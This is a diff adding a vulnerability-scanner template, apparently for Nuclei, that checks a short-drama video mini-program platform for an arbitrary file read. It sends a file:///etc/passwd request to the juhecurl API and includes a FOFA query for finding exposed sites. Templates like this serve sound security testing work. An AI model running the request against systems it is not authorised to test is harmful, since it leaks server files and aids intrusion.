@@ -1,0 +1,25 @@
+id: short-drama-miniapp-juhecurl-file-read
+
+info:
+  name: 短剧影视小程序平台juhecurl接口文件读取权限控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: "VwmRIfEYDH.php"
+    短剧影视小程序平台juhecurl接口未正确校验文件读取权限，攻击者可通过构造特定路径参数读取任意文件内容，导致敏感信息泄露
+  tags: 短剧影视小程序平台
+
+http:
+- raw:
+  - |
+    GET /api/ems/juhecurl?url=file:///etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
